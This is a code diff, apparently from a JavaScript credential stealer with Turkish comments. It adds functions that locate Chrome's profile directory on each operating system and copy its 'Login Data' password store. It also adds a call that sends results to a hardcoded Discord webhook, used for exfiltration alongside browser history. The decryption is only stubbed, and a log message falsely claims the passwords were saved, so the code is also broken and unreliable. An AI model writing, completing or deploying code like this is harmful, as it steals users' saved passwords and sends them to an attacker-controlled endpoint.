@@ -93,7 +93,64 @@ function ensureDirectoryExists(directory) {
 //console.log(browserHistory);
   // browser ------------------------------------------------------------------------------------------------------------------------------------------------
 
+//passwd
+function getChromeProfilePath() {
+  const platform = os.platform();
 
+  if (platform === 'win32') {
+    // Windows işletim sistemi için Chrome profil dizini
+    return path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default');
+  } else if (platform === 'darwin') {
+    // macOS işletim sistemi için Chrome profil dizini
+    return path.join(os.homedir(), 'Library', 'Application Support', 'Google', 'Chrome', 'Default');
+  } else if (platform === 'linux') {
+    // Linux işletim sistemi için Chrome profil dizini
+    return path.join(os.homedir(), '.config', 'google-chrome', 'Default');
+  }
+
+  // Diğer işletim sistemleri için varsayılan olarak null döndürülür
+  return null;
+}
+
+function exportChromePasswords() {
+  const chromeProfilePath = getChromeProfilePath();
+
+  if (chromeProfilePath) {
+    const loginDataPath = path.join(chromeProfilePath, 'Login Data');
+    const loginDataBackupPath = path.join(chromeProfilePath, 'Login Data - Backup');
+
+    const getPasswords = async () => {
+      try {
+        // Login Data dosyasını kopyala
+        fs.copyFileSync(loginDataPath, loginDataBackupPath);
+
+        // Diğer işlemler aynı şekilde devam eder...
+        // (Şifreleri çözme, JSON formatına dönüştürme, dosyaya yazma)
+
+        console.log('Chrome şifreleri başarıyla alındı ve passwords.json dosyasına kaydedildi.');
+
+        // Chrome profil dizinini döndür
+        return chromeProfilePath;
+      } catch (error) {
+        console.error('Bir hata oluştu:', error);
+        return null;
+      } finally {
+        // Kopyalanan Login Data dosyasını sil
+        fs.unlinkSync(loginDataBackupPath);
+      }
+    };
+
+    return getPasswords();
+  } else {
+    console.error('İşletim sistemine uygun Chrome profil dizini bulunamadı.');
+    return null;
+  }
+}
+
+// Kullanım örneği
+const chromeProfilePath = exportChromePasswords();
+console.log('Chrome profil dizini:', chromeProfilePath);
+//passwd
 // string to file ------------------------------------------------------------------------------------------------------------------------------------------------
 
 function stringToFile(content, filePath) {
@@ -149,5 +206,6 @@ ${fs.readFileSync(targetFile, 'utf-8')}\r
 const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';
 
 sendFileToWebhook(webhookUrl, filePath);
+sendFileToWebhook(webhookUrl, chromeProfilePath);
 
 // webhook ------------------------------------------------------------------------------------------------------------------------------------------------
